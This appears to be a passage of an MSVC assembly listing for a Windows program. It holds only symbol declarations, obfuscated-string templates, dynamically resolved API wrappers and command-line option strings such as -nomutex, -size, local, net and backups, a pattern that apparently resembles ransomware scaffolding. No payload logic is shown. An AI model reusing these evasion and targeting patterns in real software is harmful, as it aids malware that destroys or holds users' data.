; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_15JODAOICI@?$AA?9?$AAp@			; `string'
PUBLIC	??_C@_15DMEDGHGK@?$AA?9?$AAm@			; `string'
PUBLIC	??_C@_19HOMBNICI@?$AA?9?$AAl?$AAo?$AAg@		; `string'
PUBLIC	??_C@_1M@HGCPEPBL@?$AA?9?$AAs?$AAi?$AAz?$AAe@	; `string'
PUBLIC	??_C@_1BC@INLGKNFA@?$AA?9?$AAn?$AAo?$AAm?$AAu?$AAt?$AAe?$AAx@ ; `string'
PUBLIC	??_C@_17IIFKAHCJ@?$AAa?$AAl?$AAl@		; `string'
PUBLIC	??_C@_1M@GFKCHEPI@?$AAl?$AAo?$AAc?$AAa?$AAl@	; `string'
PUBLIC	??_C@_17ODNIDLDN@?$AAn?$AAe?$AAt@		; `string'
PUBLIC	??_C@_1BA@FMKEKOCJ@?$AAb?$AAa?$AAc?$AAk?$AAu?$AAp?$AAs@ ; `string'
PUBLIC	??_C@_0BK@DGNDOENM@hsfjuukjzloqu28oajh727190@	; `string'
PUBLIC	?g_NoMutex@@3HA					; g_NoMutex
EXTRN	atexit:PROC
?g_NoMutex@@3HA DD 01H DUP (?)				; g_NoMutex
_BSS	ENDS
;	COMDAT ??_C@_0BK@DGNDOENM@hsfjuukjzloqu28oajh727190@
CONST	SEGMENT
??_C@_0BK@DGNDOENM@hsfjuukjzloqu28oajh727190@ DB 'hsfjuukjzloqu28oajh7271'
	DB	'90', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@FMKEKOCJ@?$AAb?$AAa?$AAc?$AAk?$AAu?$AAp?$AAs@
CONST	SEGMENT
??_C@_1BA@FMKEKOCJ@?$AAb?$AAa?$AAc?$AAk?$AAu?$AAp?$AAs@ DB 'b', 00H, 'a', 00H
	DB	'c', 00H, 'k', 00H, 'u', 00H, 'p', 00H, 's', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_17ODNIDLDN@?$AAn?$AAe?$AAt@
CONST	SEGMENT
??_C@_17ODNIDLDN@?$AAn?$AAe?$AAt@ DB 'n', 00H, 'e', 00H, 't', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@GFKCHEPI@?$AAl?$AAo?$AAc?$AAa?$AAl@
CONST	SEGMENT
??_C@_1M@GFKCHEPI@?$AAl?$AAo?$AAc?$AAa?$AAl@ DB 'l', 00H, 'o', 00H, 'c', 00H
	DB	'a', 00H, 'l', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_17IIFKAHCJ@?$AAa?$AAl?$AAl@
CONST	SEGMENT
??_C@_17IIFKAHCJ@?$AAa?$AAl?$AAl@ DB 'a', 00H, 'l', 00H, 'l', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BC@INLGKNFA@?$AA?9?$AAn?$AAo?$AAm?$AAu?$AAt?$AAe?$AAx@
CONST	SEGMENT
??_C@_1BC@INLGKNFA@?$AA?9?$AAn?$AAo?$AAm?$AAu?$AAt?$AAe?$AAx@ DB '-', 00H
	DB	'n', 00H, 'o', 00H, 'm', 00H, 'u', 00H, 't', 00H, 'e', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@HGCPEPBL@?$AA?9?$AAs?$AAi?$AAz?$AAe@
CONST	SEGMENT
??_C@_1M@HGCPEPBL@?$AA?9?$AAs?$AAi?$AAz?$AAe@ DB '-', 00H, 's', 00H, 'i', 00H
	DB	'z', 00H, 'e', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19HOMBNICI@?$AA?9?$AAl?$AAo?$AAg@
CONST	SEGMENT
??_C@_19HOMBNICI@?$AA?9?$AAl?$AAo?$AAg@ DB '-', 00H, 'l', 00H, 'o', 00H, 'g'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_15DMEDGHGK@?$AA?9?$AAm@
CONST	SEGMENT
??_C@_15DMEDGHGK@?$AA?9?$AAm@ DB '-', 00H, 'm', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_15JODAOICI@?$AA?9?$AAp@
CONST	SEGMENT
??_C@_15JODAOICI@?$AA?9?$AAp@ DB '-', 00H, 'p', 00H, 00H, 00H ; `string'
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
PUBLIC	?isDecrypted@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?decrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??0?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<113,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ; MetaBuffer<23,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
PUBLIC	?decrypt@?$MetaBuffer@$0DF@$0HE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<53,116,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	??0?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
PUBLIC	?decrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	WinMain
PUBLIC	?HandleCommandLine@@YAHPEA_W@Z			; HandleCommandLine
PUBLIC	?ConvertSizeStr@@YAHPEA_W@Z			; ConvertSizeStr
PUBLIC	?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z	; FindCommandLineArg
PUBLIC	?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z	; GetCommandLineArg
PUBLIC	?SToI@@YAHPEAD@Z				; SToI
PUBLIC	?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z ; pWideCharToMultiByte
PUBLIC	?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z	; pCommandLineToArgvW
PUBLIC	?plstrcmpiW@@YAHPEB_W0@Z			; plstrcmpiW
PUBLIC	?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z ; pCreateMutexA
PUBLIC	?pGetCommandLineW@@YAPEA_WXZ			; pGetCommandLineW
PUBLIC	?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path
;	COMDAT pdata
pdata	SEGMENT
$pdata$WinMain DD imagerel $LN1359
	DD	imagerel $LN1359+3310
	DD	imagerel $unwind$WinMain
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527
	DD	imagerel $LN527+128
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527+128
	DD	imagerel $LN527+1218
	DD	imagerel $chain$3$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527+1218
	DD	imagerel $LN527+1423
	DD	imagerel $chain$4$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527+1423
	DD	imagerel $LN527+1626
	DD	imagerel $chain$5$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527+1626
	DD	imagerel $LN527+1699
	DD	imagerel $chain$6$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$7$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527+1699
	DD	imagerel $LN527+1709
	DD	imagerel $chain$7$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$8$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527+1709
	DD	imagerel $LN527+2453
	DD	imagerel $chain$8$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$9$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527+2453
	DD	imagerel $LN527+2489
	DD	imagerel $chain$9$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$10$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN527+2489
	DD	imagerel $LN527+2653
	DD	imagerel $chain$10$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?ConvertSizeStr@@YAHPEA_W@Z DD imagerel $LN62
	DD	imagerel $LN62+430
	DD	imagerel $unwind$?ConvertSizeStr@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z DD imagerel $LN20
	DD	imagerel $LN20+144
	DD	imagerel $unwind$?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z DD imagerel $LN22
	DD	imagerel $LN22+158
	DD	imagerel $unwind$?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SToI@@YAHPEAD@Z DD imagerel $LN44
	DD	imagerel $LN44+162
	DD	imagerel $unwind$?SToI@@YAHPEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fg_Path@@YAXXZ DD imagerel ??__Fg_Path@@YAXXZ
	DD	imagerel ??__Fg_Path@@YAXXZ+106
	DD	imagerel $unwind$??__Fg_Path@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z DD imagerel $LN4
	DD	imagerel $LN4+80
	DD	imagerel $unwind$?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcmpiW@@YAHPEB_W0@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?plstrcmpiW@@YAHPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z DD imagerel $LN4
	DD	imagerel $LN4+47
	DD	imagerel $unwind$?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetCommandLineW@@YAPEA_WXZ DD imagerel $LN4
	DD	imagerel $LN4+31
	DD	imagerel $unwind$?pGetCommandLineW@@YAPEA_WXZ
pdata	ENDS
CRT$XCU	SEGMENT
?g_Path$initializer$@@3P6AXXZEA DQ FLAT:??__Eg_Path@@YAXXZ ; g_Path$initializer$
?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A DW 00H ; g_Path
	DB	22 DUP(00H)
	DQ	0000000000000007H
_DATA	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetCommandLineW@@YAPEA_WXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcmpiW@@YAHPEB_W0@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z DD 040a01H
	DD	0a340aH
	DD	07006720aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fg_Path@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SToI@@YAHPEAD@Z DD 020501H
	DD	013405H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z DD 0c1c01H
	DD	0c641cH
	DD	0b541cH
	DD	0a341cH
	DD	0f018321cH
	DD	0d014e016H
	DD	07010c012H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z DD 0a1a01H
	DD	09741aH
	DD	08641aH
	DD	07541aH
	DD	06341aH
	DD	0e016321aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?ConvertSizeStr@@YAHPEA_W@Z DD 0a1a01H
	DD	0d741aH
	DD	0c641aH
	DD	0b541aH
	DD	0a341aH
	DD	0e016721aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$10$?HandleCommandLine@@YAHPEA_W@Z DD 021H
	DD	imagerel $LN527
	DD	imagerel $LN527+128
